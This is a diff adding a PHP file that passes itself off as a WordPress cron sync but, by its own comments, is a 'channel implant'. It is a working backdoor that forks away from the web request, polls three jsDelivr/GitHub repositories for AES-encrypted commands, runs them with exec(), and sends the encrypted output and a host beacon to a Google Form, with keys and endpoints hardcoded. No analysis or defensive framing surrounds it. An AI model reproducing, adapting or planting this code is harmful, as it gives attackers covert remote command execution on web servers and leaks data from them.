@@ -1,0 +1,109 @@
+<?php
+// wp-cron-sync PHP port — channel implant v4 (ch1 focus, ch2/ch3 poll too)
+// Structure mirrors channel_implant_v4.sh: lock, collect qNNNNNN from 3 repos,
+// execute, report AES-encrypted to google form. Long-running via pcntl_fork.
+$LOCK = '/dev/shm/.wcs_php_' . posix_getuid();
+$pid = @file_get_contents($LOCK);
+if ($pid !== false && $pid !== '' && $pid != getmypid() && @posix_kill((int)$pid, 0)) { exit(0); }
+@file_put_contents($LOCK, (string)getmypid());
+
+$R = [
+ 1 => 'https://cdn.jsdelivr.net/gh/hashimubadiya14-rgb/sync-registry-7f3a@master',
+ 2 => 'https://cdn.jsdelivr.net/gh/hashimubadiya14-rgb/cache-notes-m2k9@master',
+ 3 => 'https://cdn.jsdelivr.net/gh/hashimubadiya14-rgb/asset-tracker-q4vw@master',
+];
+$T = [1=>'gzy1Ccmn1p64yYtTlMKTvY41yBOjv',2=>'p9JqgoYIbrPIUizeRQ9zOtEtTqzJBqj',3=>'gitet0Zu9FV7kCU4MixrYdgypjO9YYO'];
+$FORM = 'https://docs.google.com/forms/d/e/1FAIpQLSfGUJt5MnKfYY4BhdPYmMyJcvkh78mJWjtAIcowFfpB0-c0KQ/formResponse';
+$ENTRY = 'entry.404732359';
+
+function uget($url, $to = 25) {
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER=>true, CURLOPT_TIMEOUT=>$to, CURLOPT_FOLLOWLOCATION=>true, CURLOPT_USERAGENT=>'Mozilla/5.0']);
+    $b = curl_exec($ch);
+    curl_close($ch);
+    return $b;
+}
+function upost($url, $post) {
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER=>true, CURLOPT_TIMEOUT=>25, CURLOPT_POST=>true, CURLOPT_POSTFIELDS=>http_build_query($post)]);
+    $b = curl_exec($ch);
+    $c = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    return [$b, $c];
+}
+function decr($secret, $b64) {
+    $raw = base64_decode($b64);
+    if ($raw === false || substr($raw,0,8) !== 'Salted__') return null;
+    $salt = substr($raw,8,8); $body = substr($raw,16);
+    $ki = hash_pbkdf2('sha256', $secret, $salt, 10000, 48, true);
+    $d = openssl_decrypt($body, 'aes-256-cbc', $ki, OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING, '');
+    if ($d === false) { // manual: decrypt then unpad
+        $td = openssl_decrypt($body, 'aes-256-cbc', substr($ki,0,32), OPENSSL_RAW_DATA, substr($ki,32,16));
+        $d = $td;
+    }
+    if ($d === false || $d === null) return null;
+    $p = ord(substr($d,-1));
+    if ($p >= 1 && $p <= 16) $d = substr($d, 0, -$p);
+    return $d;
+}
+function encr($secret, $data) {
+    $salt = openssl_random_pseudo_bytes(8);
+    $ki = hash_pbkdf2('sha256', $secret, $salt, 10000, 48, true);
+    $pad = 16 - (strlen($data) % 16);
+    $data .= str_repeat(chr($pad), $pad);
+    $ct = openssl_encrypt($data, 'aes-256-cbc', substr($ki,0,32), OPENSSL_RAW_DATA, substr($ki,32,16));
+    return base64_encode('Salted__' . $salt . $ct);
+}
+function up($chtag, $secret, $data) {
+    global $FORM, $ENTRY;
+    $p = encr($secret, $data);
+    if ($p === false || $p === '') return false;
+    for ($i=0; $i<3; $i++) {
+        list(,$code) = upost($FORM, [$ENTRY => $chtag.'|'.$p, 'fvv'=>'1', 'pageHistory'=>'0']);
+        if ($code === 200) return true;
+        sleep(5);
+    }
+    return false;
+}
+
+// detach: fork so PHP-FPM request can finish
+$pid = function_exists('pcntl_fork') ? pcntl_fork() : -1;
+if ($pid === -1) { /* no fork: run inline but short */ }
+if ($pid > 0) { exit(0); } // parent exits (web request completes)
+if ($pid === 0) {
+  if (function_exists('posix_setsid')) @posix_setsid();
+  // child continues forever
+}
+
+up('ch1', $T[1], 'BOOT php-implant ' . date('c') . ' pid=' . getmypid() . ' host=' . php_uname('n'));
+
+$W = '/dev/shm/.csphp_' . getmypid();
+@mkdir($W, 0755, true);
+$cnt = [];
+while (true) {
+    $bust = 't=' . time();
+    for ($ch = 1; $ch <= 3; $ch++) {
+        $cf = "$W/n$ch";
+        $n = is_file($cf) ? (int)trim(@file_get_contents($cf)) : 1;
+        $k = $n; $got = 0;
+        for ($step = 0; $step < 3; $step++) {
+            $nn = sprintf('%06d', $k);
+            $d = uget($R[$ch] . "/queue/q$nn.txt?$bust", 12);
+            if ($d === false || $d === '' || strpos((string)$d, "Couldn't find") !== false || strpos((string)$d, '404') === 0) break;
+            $cmd = decr($T[$ch], trim($d));
+            if ($cmd === null || $cmd === '') break;
+            $out = [];
+            $rc = 0;
+            @exec($cmd . ' 2>&1', $out, $rc);
+            $res = implode("\n", $out);
+            if ($res === '') $res = '(empty)';
+            // fold into 1500-char chunks
+            foreach (str_split($res, 1500) as $i => $part) {
+                up("ch$ch", $T[$ch], "RES|$nn|" . base64_encode($part));
+            }
+            $k++; $got++;
+            @file_put_contents($cf, (string)$k);
+        }
+    }
+    sleep(30);
+}
